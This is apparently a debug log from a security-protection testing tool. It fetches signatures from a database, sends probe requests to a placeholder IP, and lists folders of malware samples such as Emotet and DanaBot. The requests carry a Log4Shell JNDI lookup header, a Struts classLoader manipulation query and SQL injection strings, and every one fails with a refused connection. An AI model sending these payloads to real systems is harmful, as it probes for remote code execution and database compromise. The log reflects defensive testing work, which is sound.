2025-12-02 17:12:42 - INFO - get_protection_by_name:399 - Protection 'Apache Log4j Remote Code Execution (CVE-2021-44228)' retrieved successfully.
2025-12-02 17:12:42 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/ with headers: {'User-Agent': '${jndi:ldap://127.0.0.1#log4shell-generic-c6hAKQa3xrV889pe4Lrm.w.nessus.org/nessus}'}
2025-12-02 17:12:44 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8A8B0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:44 - INFO - get_protection_by_name:371 - Fetching protection by name: Apache Struts ParametersInterceptor ClassLoader Security Bypass
2025-12-02 17:12:44 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Apache Struts ParametersInterceptor ClassLoader Security Bypass', 'CVE-2014-0094,CVE-2014-0112,CVE-2014-0113,CVE-2014-0114', 'GET', 'http://{{IP}}/?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1731362486', 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:12:44 - INFO - get_protection_by_name:399 - Protection 'Apache Struts ParametersInterceptor ClassLoader Security Bypass' retrieved successfully.
2025-12-02 17:12:44 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1731362486 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:12:47 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/?class.classLoader.URLs[0]=struts_2_3_16_1_classloader_manipulation-1731362486: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /?class.classLoader.URLs%5B0%5D=struts_2_3_16_1_classloader_manipulation-1731362486 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8AE00>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:12:51 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:12:51 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:12:51 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:13:02 - DEBUG - dir_listing:320 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 17:13:04 - INFO - load_generated_files:473 - Loading all generated files from the database.
2025-12-02 17:13:04 - DEBUG - load_generated_files:499 - Fetched 0 records from 'generated_files' table.
2025-12-02 17:13:04 - DEBUG - load_generated_files:502 - Database connection closed after load_generated_files.
2025-12-02 17:13:21 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:13:21 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:13:21 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:13:54 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:13:54 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:13:54 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:14:59 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:14:59 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:14:59 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:15:18 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:15:18 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:15:18 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:15:18 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:15:20 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F89590>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:15:20 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 17:15:20 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 17:15:20 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 17:15:20 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:15:22 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F88270>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:16:52 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:16:52 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:16:52 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:16:54 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:16:54 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:16:54 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:16:54 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:16:56 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F885A0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:16:56 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 17:16:56 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 17:16:56 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 17:16:56 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:16:58 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F89370>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:17:06 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:17:06 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:17:06 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:17:06 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:17:08 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8ACF0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:17:08 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:17:08 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:17:08 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:24:19 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:24:19 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:24:19 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:26:16 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:26:16 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:26:16 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:26:34 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:26:34 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:26:34 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:27:55 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:27:55 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:27:55 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:28:09 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:28:09 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:28:09 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:29:10 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:29:10 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:29:10 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:29:13 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:29:13 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:29:13 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:29:16 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:29:16 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:29:16 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:29:19 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:29:19 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:29:20 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:29:28 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:29:28 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:29:28 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:29:31 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:29:31 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:29:31 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:31:00 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:31:00 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:31:00 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:31:04 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:31:04 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:31:04 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:31:08 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:31:08 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:31:08 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:31:13 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:31:13 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:31:13 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:31:19 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:31:19 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:31:19 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:31:22 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:31:22 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:31:22 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:34:09 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:34:09 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:34:09 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:34:16 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:34:16 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:34:16 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:34:41 - DEBUG - dir_listing:320 - Files and directories: [{'name': 'Banking-Malware', 'path': 'Banking-Malware', 'is_file': False}, {'name': 'eicar', 'path': 'eicar', 'is_file': False}, {'name': 'Email-Worm', 'path': 'Email-Worm', 'is_file': False}, {'name': 'Joke', 'path': 'Joke', 'is_file': False}, {'name': 'Net-Worm', 'path': 'Net-Worm', 'is_file': False}, {'name': 'Pony', 'path': 'Pony', 'is_file': False}, {'name': 'Ransomware', 'path': 'Ransomware', 'is_file': False}, {'name': 'RAT', 'path': 'RAT', 'is_file': False}, {'name': 'rogues', 'path': 'rogues', 'is_file': False}, {'name': 'Spyware', 'path': 'Spyware', 'is_file': False}, {'name': 'Stealer', 'path': 'Stealer', 'is_file': False}, {'name': 'Trojan', 'path': 'Trojan', 'is_file': False}, {'name': 'Virus', 'path': 'Virus', 'is_file': False}, {'name': 'Worm', 'path': 'Worm', 'is_file': False}]
2025-12-02 17:34:46 - DEBUG - dir_listing:320 - Files and directories: [{'name': 'DanaBot.exe', 'path': 'Banking-Malware\\DanaBot.exe', 'is_file': True}, {'name': 'Dridex', 'path': 'Banking-Malware\\Dridex', 'is_file': False}, {'name': 'Emotet.zip', 'path': 'Banking-Malware\\Emotet.zip', 'is_file': True}, {'name': 'Zloader.xlsm', 'path': 'Banking-Malware\\Zloader.xlsm', 'is_file': True}]
2025-12-02 17:38:00 - INFO - init_db:58 - Initializing protections database.
2025-12-02 17:38:00 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 17:38:00 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 17:38:00 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 17:38:00 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 17:38:00 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 17:38:00 - INFO - init_db:58 - Initializing protections database.
2025-12-02 17:38:00 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 17:38:00 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 17:38:00 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 17:38:00 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 17:38:00 - ERROR - load_csv_to_db:305 - SQLite error on row 2: no such table: protections
2025-12-02 17:38:00 - ERROR - load_csv_to_db:305 - SQLite error on row 3: no such table: protections
2025-12-02 17:38:00 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 17:38:00 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 17:38:00 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 17:38:00 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 17:38:00 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 17:38:00 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 17:38:00 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 17:38:00 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 17:38:00 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 17:38:00 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 17:38:00 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 17:38:00 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 17:38:00 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 17:38:00 - INFO - init_db:58 - Initializing protections database.
2025-12-02 17:38:00 - DEBUG - init_db:64 - Dropping existing 'protections' table if it exists.
2025-12-02 17:38:00 - DEBUG - init_db:68 - Creating 'protections' table.
2025-12-02 17:38:00 - INFO - init_db:86 - 'protections' table created successfully.
2025-12-02 17:38:00 - DEBUG - init_db:93 - Database connection closed after init_db.
2025-12-02 17:38:00 - INFO - init_db_for_generated_files:103 - Initializing generated_files database.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:109 - Dropping existing 'generated_files' table if it exists.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:113 - Creating 'generated_files' table.
2025-12-02 17:38:00 - INFO - init_db_for_generated_files:133 - 'generated_files' table created successfully.
2025-12-02 17:38:00 - DEBUG - init_db_for_generated_files:140 - Database connection closed after init_db_for_generated_files.
2025-12-02 17:38:00 - INFO - load_csv_to_db:259 - Starting to load CSV data into protections database.
2025-12-02 17:38:00 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 17:38:00 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 17:38:00 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 17:38:00 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
